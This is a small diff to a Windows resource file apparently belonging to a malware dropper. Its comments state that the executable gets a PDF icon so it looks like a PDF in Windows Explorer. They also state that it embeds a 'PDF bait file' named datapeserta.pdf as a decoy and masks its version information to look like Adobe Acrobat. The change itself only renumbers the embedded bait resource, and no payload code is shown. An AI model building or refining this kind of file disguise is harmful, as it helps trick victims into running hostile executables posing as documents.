@@ -5,9 +5,8 @@
 // This will make it look like a standard PDF file in Windows Explorer
 MAINICON ICON "..\\icon\\pdf.ico"
 
-// 2. Embedding the PDF bait file
-// IDR_PDF_DATA is a custom identifier for the binary data
-IDR_PDF_DATA RCDATA "..\\file\\datapeserta.pdf"
+// ID 100 is reserved for the binary PDF bait data
+100 RCDATA "..\\file\\datapeserta.pdf"
 
 // 3. Version Information for Masking
 // This makes the file properties look like Adobe Acrobat
